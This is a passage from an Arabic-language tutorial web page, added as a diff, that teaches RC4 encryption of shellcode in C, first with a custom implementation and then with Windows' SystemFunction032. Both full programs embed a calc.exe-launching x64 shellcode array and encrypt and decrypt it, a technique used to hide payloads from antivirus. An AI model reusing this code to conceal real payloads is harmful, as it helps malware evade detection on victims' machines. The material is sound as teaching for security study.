+                        &nbsp;&nbsp;getchar();<br><br>
+                        
+                        &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                    
+            </code></div>
+                <br>
+                <h2 style="direction: ltr;">2. RC4 Encryption :</h2>
+                <p>[+] هنتكلم ع تاني جزء معانا وهو ألجوريزم الـ RC4 أو الـ <code
+                        style="background: #16ff00; font-size: 14px;">Rivest Cipher 4</code> .. دا نوع من أنواع التشفير
+                    بيشتغل بطريقة الـ <code
+                        style="background: #16ff00; font-size: 14px;">Symmetric Key Encryption</code> .. وده معناه إن
+                    الـ key اللـ بيشفر الداتا هو نفسه
+                    اللـ بيفك التشفير.</p>
+                <p style="font-weight: bold;">[+] طب شغال إزاي بقى؟</p>
+                <p>الـ RC4 بيعتمد ع إنه بيولد حاجه اسمها <code
+                        style="background: #16ff00; font-size: 14px;">Keystream</code> عشوائي ، وبعدها بياخد كل بايت من
+                    الداتا اللـ
+                    عاوز تشفرها ، ويعمل عليه XOR مع بايت من الـ key ، فينتج عندك الداتا المشفرة .. ونفس العملية بتحصل في
+                    فك التشفير، لأن XOR لو اتعمل مرتين بيرجعلك الحاجة الأصلية ، ودا عرفناه فـ الجزء اللـ اتكلمنا عنه
+                    فوق.</p>
+                <p style="font-weight: bold;">[+] وبيتم ع 3 مراحل:</p>
+                <ol>
+                    <li style="font-weight: bold;">تهيئة الكي (Key Scheduling Algorithm - KSA) :</li>
+                    <p>↑ الفكرة هنا إننا بنجهز حاجة اسمها <code
+                            style="background: #16ff00; font-size: 14px;">S-Box</code> ، ودي عبارة عن مصفوفة فيها القيم
+                        من 0 لـ 255 .. بعدين
+                        بنستخدم الـ key اللـ هنشفر بيه عشان نبدل القيم جوه المصفوفة بطريقة معينة.</p>
+                    <ul>
+                        <li>هقولك مثال عشان تفهمها .. تخيل إنك فـ مدرج الكلية .. المدرج ده فيه إنت وزمايلك وعددكم 255
+                            طالب
+                            ..
+                            كل طالب قاعد بالترتيب من أول رقم 0 لـ 255.</li>
+                        <li>بعدين هنبدأ نستخدم الكي بتاعنا عشان نغير مكانك إنت وزمايلك بترتيب معين ع حسب الكي .. فـ إنت
+                            لو كنت فـ بداية الترتيب رقم 3 مثلا وصحبك اللـ جمبك فـ الترتيب 4 .. بعد إستخدام الكي إنت ممكن
+                            تكون 50 وصحبك 220 مثلا.</li>
+                        <li>والهدف هنا إننا بنعمل تشتيت فـ الترتيب بحيث المصفوفة تكون عشوائية ع حسب الكي المستخدم.</li>
+                    </ul>
+                    <li style="font-weight: bold;">توليد تيار الكي (Pseudo-Random Generation Algorithm - PRGA) :</li>
+                    <p>↑ دلوقتي بعد مـ خلصنا التهيئة ، بنبدأ نولد الـ Keystream .. والفكرة هنا إننا هنمشي خطوة خطوة فـ
+                        المصفوفة اللـ لسه مغيرينها ، ونستخدم القيم اللـ فيها عشان نطلع سلسلة من الأرقام العشوائية اللـ
+                        هنستخدمها فـ التشفير.</p>
+                    <ul>
+                        <li>مثال عشان تفهمها .. تخيل إن عندك بكرة شريط ورق مكتوب عليها أرقام بطريقة عشوائية.</li>
+                        <li>كل مرة عايز تشفر حرف ، بتاخد رقم من البكرة وتستخدمه فـ XOR مع الحرف الأصلي عشان يطلع لك حرف
+                            مشفر.</li>
+                        <li>طب لو عايز تفك التشفير؟ كل اللـ عليك إنك تستخدم نفس بكرة الأرقام ، وتعمل XOR تاني مع النص
+                            المشفر، هيرجع للنص الأصلي بالظبط.</li>
+                    </ul>
+                    <li style="font-weight: bold;">عملية التشفير الفعلية (XOR بين الداتا وتيار الكي) :</li>
+                    <p>↑ وكل الفكرة هنا إننا بنستخدم الـ XOR بين الداتا الأصلية و تيار الكي عشان ننتج النص المشفر.</p>
+                </ol>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/RC4-1webp.webp" alt="RC4" class="article-image" loading="lazy">
+                </div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.1 RC4 Encryption Via Custom Implementation :</h3>
+                <p>[+] أول طريقة معانا ، واللـ سميتها Custom Implementation ، لإن بعتمد فيها ع مصادر أكواد خارجية ودا
+                    <a href="https://www.oryx-embedded.com/doc/rc4_8c_source.html" target="_blank"
+                        class="download-link">لينك المصدر</a> اللـ هتلاقي فيه الكود ، وأنا بس مُجرد عدلت حاجات بسيطة فـ
+                    الكود.
+                </p>
+                <ol>
+                    <li style="font-weight: bold;">عندنا فـ البداية struct أو structure (هيكل بيانات) إسمها Rc4Context ،
+                        ودي مهمتها إنها بتسيڤ
+                        معلومات بتجيلها من عملية الـ rc4Init و بتحتوي ع 3 حاجات:</li>
+                    <ul>
+                        <li>i و j: دول متغيرات بيتم استخدامهم أثناء التشفير.</li>
+                        <li>s[256]: دي مصفوفة فيها القيم من 0 لـ 255 ، وهي اللـ بيتعمل عليها التبديلات العشوائية
+                            باستخدام الكي.</li>
+                    </ul>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-2.png" alt="RC4-2" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">تاني جزء ودي عملية الـ Initialization نفسها ودي اللـ بتهيئ الـ
+                        structure.</li>
+
+                    <div class="code-block">
+                        <code>void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)</code>
+                    </div>
+                    دي وظيفتها إنها
+                    تجهّز RC4 باستخدام الكي اللـ هنعمل بيه التشفير أو فك التشفير .. بتاخد 3 حاجات:
+                    <ol>
+                        <li>context: المكان اللـ هنخزن فيه بيانات الـ RC4 أثناء التشغيل.</li>
+                        <li>key: المفتاح اللـ هيتم استخدامه فـ التشفير.</li>
+                        <li>length: طول الكي (عشان نعرف نستخدمه بطريقة دائرية).</li>
+                    </ol>
+
+                    <div class="code-block"><code>if (context == NULL || key == NULL) return; </code></div>
+                    لو context أو key فاضيين ، مش هنكمل لأن التشفير مستحيل يشتغل من غيرهم.
+
+                    <div class="code-block"><code>context->i = 0;
+                        context->j = 0;</code></div>
+                    بنبدأ بـ i و j بـ 0 عشان نضمن إن التشفير هيبدأ من الأول.
+
+                    <div class="code-block"><code>for (i = 0; i < 256; i++) context->s[i] = i; </code></div> هنا بنملأ
+                    المصفوفة s بالقيم من 0 لـ 255.
+                    <div class="code-block"><code>for (i = 0, j = 0; i < 256; i++) {<br>
+                        &nbsp;&nbsp;j = (j + context->s[i] + key[i % length]) % 256;<br>
+                        &nbsp;&nbsp;temp = context->s[i];<br>
+                        &nbsp;&nbsp;context->s[i] = context->s[j];<br>
+                        &nbsp;&nbsp;context->s[j] = temp;<br>
+                    }</code></div>
+                    هنا بنخلط القيم فـ s باستخدام الكي ، وده اللـ بيعمل العشوائية فـ التشفير.
+                    </ul>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-3.png" alt="RC4-3" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">تالت جزء ودي عملية التشفير نفسها ودي بإسم rc4Cipher:</li>
+                    <div class="code-block">
+                        <code>void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length)</code>
+                    </div>
+                    دي الدالة اللـ بتنفذ التشفير الفعلي ، وبتاخد 4 حاجات:
+                    <ol>
+                        <li>context: بيانات الـ RC4.</li>
+                        <li>input: البيانات اللـ هنشفرها أو نفك تشفيرها.</li>
+                        <li>output: المكان اللـ هنخزن فيه النتيجة.</li>
+                        <li>length: عدد البايتات اللـ هنعالجها.</li>
+                    </ol>
+                    <div class="code-block"><code>unsigned int i = context->i;<br>
+                        unsigned int j = context->j;<br>
+                        unsigned char* s = context->s;</code></div>
+                    هنا بنجيب i و j و s من context عشان نشتغل بيهم.
+                    <div class="code-block"><code>while (length > 0) {<br>
+                        &nbsp;&nbsp;i = (i + 1) % 256;<br>
+                        &nbsp;&nbsp;j = (j + s[i]) % 256;<br>
+                        &nbsp;&nbsp;temp = s[i];<br>
+                        &nbsp;&nbsp;s[i] = s[j];<br>
+                        &nbsp;&nbsp;s[j] = temp;</code></div>
+                    هنلف ع كل بايت فـ input ، كل مرة بنغير قيم i و j وبنبدل قيم s[i] و s[j] عشان نعمل عشوائية أكتر.
+                    <div class="code-block"><code>
+                        &nbsp;&nbsp;if (input != NULL && output != NULL)<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;*output = *input ^ s[(s[i] + s[j]) % 256];<br></code></div>
+                    هنا بناخد بايت من البيانات الأصلية (input) ونعمله XOR مع بايت من s .. وده اللـ بيعمل التشفير أو فك
+                    التشفير ، لأن قولنا الـ XOR نفس العملية في الاتجاهين.
+                    <div class="code-block"><code>&nbsp;&nbsp;input++;<br>
+                        &nbsp;&nbsp;output++;<br>
+                        &nbsp;&nbsp;length--;</code></div>
+                    بعد كل خطوة ، بنروح للبايت اللـ بعده لحد مـ نخلص كل البيانات.
+                    <div class="code-block"><code>context->i = i;<br>
+                        context->j = j;</code></div>
+                    فـ الآخر ، بنحفظ i و j عشان لو هنستخدم context تاني يكون بنفس الحالة اللـ وصلنالها.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-4.png" alt="RC4-4" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">هنضيف الشيل كود والكي اللـ اشتغلنا بيه قبل كده:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-5.png" alt="RC4-5" class="article-image" loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">جزء الـ Main Function :</li>
+                    <div class="code-block"><code>size_t shellcode_len = sizeof(OurShellCode) - 1;</code></div>
+                    بنحسب طول الـ ShellCode اللـ معانا.
+                    <div class="code-block"><code>Rc4Context ctx = { 0 }; <br>rc4Init(&ctx, keys, sizeof(keys));</code>
+                    </div>
+                    بنجهز الـ RC4 بالكي اللـ عندنا.
+                    <div class="code-block"><code>    unsigned char* Ciphertext = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, shellcode_len);
+                    </code></div>
+                    بنحجز مكان فـ الميموري .. ولو مش فاكر الـ ()HeapAlloc ، إرجع لأول مقالة فـ جزء الـ Memory
+                    Management.
+                    <div class="code-block"><code>    ZeroMemory(Ciphertext, shellcode_len);
+                    </code></div>
+                    دي مهمتها إنها بتصفر كل المنطقة اللـ حجزناها .. قول يعني إنها بتنظفها وتجهزها .
+                    <div class="code-block"><code>    rc4Cipher(&ctx, OurShellCode, Ciphertext, shellcode_len);
+                    </code></div>
+                    ودي العملية اللـ بتشفر الشيل كود بالـ RC4.<br>
+                    [+] ضيفت كذا عملية طباعة زي فـ الأول العنوان بتاع الشيل كود قبل التشفير ، وبعد التشفير .. وبطبع
+                    الشيل
+                    كود نفسه بعد مـ اتشفر.<br>
+                    [+] بعد كدا ندخل ع عملية فك التشفير:
+                    <div class="code-block"><code>rc4Init(&ctx, keys, sizeof(keys));</code></div>
+                    لازم نعيد تهيئة RC4 بالكي نفسه عشان الـ context اتغير وقت التشفير.
+                    <div class="code-block"><code>unsigned char* Plaintext = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, shellcode_len);<br>
+                        ZeroMemory(Plaintext, shellcode_len);</code></div>
+                    بنحجز مكان تاني فـ الميموري عشان نحفظ فيه عملية فك التشفير .. وبنجهزها بالـ ZeroMemory.
+                    <div class="code-block"><code>rc4Cipher(&ctx, Ciphertext, Plaintext, shellcode_len);</code></div>
+                    بنفك التشفير بنفس الطريقة اللـ عملناها فـ التشفير.
+                    <div class="code-block"><code> HeapFree(GetProcessHeap(), 0, Ciphertext);<br>
+                        HeapFree(GetProcessHeap(), 0, Plaintext);</code></div>
+                    آخر جزء وإنه بنفضي المكانين اللـ حجزناهم قبل كده .. ولو مش عارف الحتة دي إرجع للـ Memory Management
+                    فـ أول مقالة.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-6.png" alt="RC4-6" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن:</p>
+                <ol style="font-weight: bold;">
+                    <li>دا كدا عنوان الشيل كود قبل عملية التشفير:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-7.png" alt="RC4-7" class="article-image" loading="lazy">
+                    </div>
+                    <li>وهنا هتلاقي عنوان الشيل كود بعد عملية التشفير:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-8.png" alt="RC4-8" class="article-image" loading="lazy">
+                    </div>
+                    <li>بعد عملية فك التشفير هتلاقي الشيل كود رجع زي مـ كان فـ أول عنوان ، ونجحت العملية.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-9.png" alt="RC4-9" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت أول طريقة فـ الـ RC4 .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
+                    <br>
+                    typedef struct {<br>
+                        &nbsp;&nbsp;unsigned int i;<br>
+                        &nbsp;&nbsp;unsigned int j;<br>
+                        &nbsp;&nbsp;unsigned char s[256];<br>
+                    } Rc4Context;<br><br>
+                    void rc4Init(Rc4Context* context, const unsigned char* key, size_t length) {<br>
+                        &nbsp;&nbsp;unsigned i, j;<br>
+                        &nbsp;&nbsp;unsigned char temp;<br><br>
+                    
+                        &nbsp;&nbsp;if (context == NULL || key == NULL)<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return;<br><br>
+                    
+                        &nbsp;&nbsp;context->i = 0;<br>
+                        &nbsp;&nbsp;context->j = 0;<br><br>
+                    
+                        &nbsp;&nbsp;for (i = 0; i < 256; i++)<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;context->s[i] = i;<br><br>
+                    
+                        &nbsp;&nbsp;for (i = 0, j = 0; i < 256; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;j = (j + context->s[i] + key[i % length]) % 256;<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;temp = context->s[i];<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;context->s[i] = context->s[j];<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;context->s[j] = temp;<br>
+                            &nbsp;&nbsp; }<br>
+                    }<br><br>
+                    void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {<br>
+                        &nbsp;&nbsp;unsigned char temp;<br>
+                        &nbsp;&nbsp;unsigned int i = context->i;<br>
+                        &nbsp;&nbsp;unsigned int j = context->j;<br>
+                        &nbsp;&nbsp;unsigned char* s = context->s;<br><br>
+                    
+                        &nbsp;&nbsp;while (length > 0) {<br>
+                            &nbsp;&nbsp; &nbsp;&nbsp;i = (i + 1) % 256;<br>
+                            &nbsp;&nbsp; &nbsp;&nbsp;j = (j + s[i]) % 256;<br>
+                            &nbsp;&nbsp; &nbsp;&nbsp;temp = s[i];<br>
+                            &nbsp;&nbsp; &nbsp;&nbsp;s[i] = s[j];<br>
+                            &nbsp;&nbsp; &nbsp;&nbsp;s[j] = temp;<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;if (input != NULL && output != NULL)<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;*output = *input ^ s[(s[i] + s[j]) % 256];<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;input++;<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;output++;<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;length--;<br>
+                            &nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;context->i = i;<br>
+                            &nbsp;&nbsp;context->j = j;<br>
+                     }<br><br>
+                    unsigned char OurShellCode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                    <br>
+                    unsigned char keys[] = { 0x04, 0x0d, 0x0e, 0x01 };<br><br>
+                    
+                    int main() {<br>
+                        &nbsp;&nbsp;size_t shellcode_len = sizeof(OurShellCode) - 1;<br><br>
+                    
+                        &nbsp;&nbsp;Rc4Context ctx = { 0 };<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] ShellCode Plaintext Address: 0x%p\n", OurShellCode);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt .....");<br>
+                        &nbsp;&nbsp;getchar();<br>
+                        &nbsp;&nbsp;rc4Init(&ctx, keys, sizeof(keys));<br><br>
+                    
+                        &nbsp;&nbsp;unsigned char* Ciphertext = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, shellcode_len);<br>
+                        &nbsp;&nbsp;ZeroMemory(Ciphertext, shellcode_len);<br>
+                        &nbsp;&nbsp;rc4Cipher(&ctx, OurShellCode, Ciphertext, shellcode_len);<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] ShellCode Encrypted Address: 0x%p\n", Ciphertext);<br>
+                        &nbsp;&nbsp;printf("[i] Encrypted ShellCode: ");<br>
+                        &nbsp;&nbsp;for (size_t i = 0; i < shellcode_len; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", Ciphertext[i]);<br>
+                            &nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;printf("\n\n");<br><br>
+                    
+                            &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Decrypt .....");<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                    
+                    
+                            &nbsp;&nbsp;rc4Init(&ctx, keys, sizeof(keys));<br><br>
+                    
+                            &nbsp;&nbsp;unsigned char* Plaintext = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, shellcode_len);<br>
+                            &nbsp;&nbsp;ZeroMemory(Plaintext, shellcode_len);<br>
+                            &nbsp;&nbsp;rc4Cipher(&ctx, Ciphertext, Plaintext, shellcode_len);<br><br>
+                    
+                            &nbsp;&nbsp;printf("[i] Decrypted ShellCode: ");<br>
+                            &nbsp;&nbsp;for (size_t i = 0; i < shellcode_len; i++) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", Plaintext[i]);<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;printf("\n");<br><br>
+                    
+                                &nbsp;&nbsp;getchar();<br><br>
+                    
+                                &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, Ciphertext);<br>
+                                &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, Plaintext);<br><br>
+                    
+                                &nbsp;&nbsp;return 0;<br>
+                    }<br>
+                    
+            </code></div>
+                <br>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.2 RC4 Encryption Via SystemFunction032 :</h3>
+                <p>[+] تاني طريقة وهي باستخدام دالة موجودة في مكتبة <code
+                        style="background: #16ff00; font-size: 14px;">Advapi32.dll</code> بتقدر تنفذ عملية RC4
+                    Encryption
+                    من الـ Windows API ، إسمها <code
+                        style="background: #16ff00; font-size: 14px;">SystemFunction032</code>.</p>
+                <ol>
+                    <li>أول جزء عندنا Structure إسمها <code style="background: #16ff00; font-size: 14px;">USTRING</code>
+                        ، ودي طريقة تبع الويندوز لتمثيل البيانات اللـ هنتعامل
+                        معاها ، وهي شبيهة بـ STRING بس مخصصة للـ <code
+                            style="background: #16ff00; font-size: 14px;">NT API</code> .. وبنستخدمها عشان نمرر الداتا
+                        والكي لدالة
+                        التشفير .</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-10.png" alt="RC4-10" class="article-image" loading="lazy">
+                    </div>
+                    <li>تاني جزء ودا تعريف <code style="background: #16ff00; font-size: 14px;">SystemFunction032</code>
+                        .. ده نوع مخصص (typedef) بيقول إن <code
+                            style="background: #16ff00; font-size: 14px;">SystemFunction032</code> هي دالة
+                        بترجع NTSTATUS ، وبتاخد بيانات (Data) ومفتاح (key) للتشفير أو فك التشفير.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-11.png" alt="RC4-11" class="article-image" loading="lazy">
+                    </div>
+                    <li>تالت جزء ودي الدالة نفسها اللـ هتشفر وتفك .. بنستخدم GetProcAddress عشان نجيب عنوان
+                        <code style="background: #16ff00; font-size: 14px;">SystemFunction032</code> من مكتبة <code
+                            style="background: #16ff00; font-size: 14px;">Advapi32.dll</code> ، وده عشان تشتغل ع طول من
+                        غير مـ نحتاج نعرفها مسبقا فـ
+                        الكود .. بعدين الدالة بتاخد الشيل كود والكي ، وبتستخدم الـ <code
+                            style="background: #16ff00; font-size: 14px;">SystemFunction032</code> عشان تنفذ التشفير
+                        .. ولو حصل أي إيرور ، بنطبع رسالة فشل.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-12.png" alt="RC4-12" class="article-image" loading="lazy">
+                    </div>
+                    <li>رابع جزء ودا الشيل كود والكي اللـ بنستخدمهم كل مرة.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-13.png" alt="RC4-13" class="article-image" loading="lazy">
+                    </div>
+                    <li>آخر جزء وده الـ Main Function اللـ فيه بنستدعي الدوال اللـ فوق عشان نشفر الشيل كود، وبعدها نفك
+                        التشفير بنفس الكي.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-14.png" alt="RC4-14" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ol style="font-weight: bold;">
+                    <li>الشيل كود قبل عملية التشفير :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-15.png" alt="RC4-15" class="article-image" loading="lazy">
+                    </div>
+                    <li>بعد مـ الشيل كود اتشفر :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-16.png" alt="RC4-16" class="article-image" loading="lazy">
+                    </div>
+                    <li>ودا فك التشفير وكلو تمام :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/RC4-17.png" alt="RC4-17" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت تاني طريقة فـ الـ RC4 .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
+                    <br>
+                    typedef struct<br>
+                    {<br>
+                        &nbsp;&nbsp;DWORD Length;<br>
+                        &nbsp;&nbsp;DWORD MaximumLength;<br>
+                        &nbsp;&nbsp;PVOID Buffer;<br>
+                    } USTRING;<br><br>
+                    typedef NTSTATUS(NTAPI* fnSystemFunction032)(<br>
+                    &nbsp;&nbsp;struct USTRING* Data,<br>
+                    &nbsp;&nbsp;struct USTRING* key<br>
+                        );<br><br>
+                        BOOL Rc4EncryptionViaSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD swRc4KeySize, DWORD sPayloadSize) {<br>
+                            &nbsp;&nbsp;NTSTATUS STATUS = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;USTRING Data = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };<br>
+                            &nbsp;&nbsp;USTRING key = { .Buffer = pRc4Key, .Length = swRc4KeySize, .MaximumLength = swRc4KeySize };<br><br>
+                        
+                            &nbsp;&nbsp;fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");<br><br>
+                        
+                            &nbsp;&nbsp;if ((STATUS = SystemFunction032(&Data, &key)) != 0x0) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] SystemFunction032 FAILED with Error : 0x%0.8X \n", STATUS);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;return TRUE;<br>
+                        }<br><br>
+                    unsigned char OurShellCode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                    <br>
+                    unsigned char keys[] = { 0x04, 0x0d, 0x0e, 0x01 };<br><br>
+                    
+                    int main() {<br>
+                        &nbsp;&nbsp;size_t shellcode_len = sizeof(OurShellCode) - 1; <br><br>
+                    
+                        &nbsp;&nbsp;unsigned char OriginalShellCode[sizeof(OurShellCode)];<br>
+                        &nbsp;&nbsp;memcpy(OriginalShellCode, OurShellCode, sizeof(OurShellCode)); <br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] OurShellCode Plaintext Address: 0x%p\n", OurShellCode);<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt .....\n");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                    
+                        &nbsp;&nbsp;if (!Rc4EncryptionViaSystemFunc032(keys, OurShellCode, sizeof(keys), shellcode_len)) {<br>
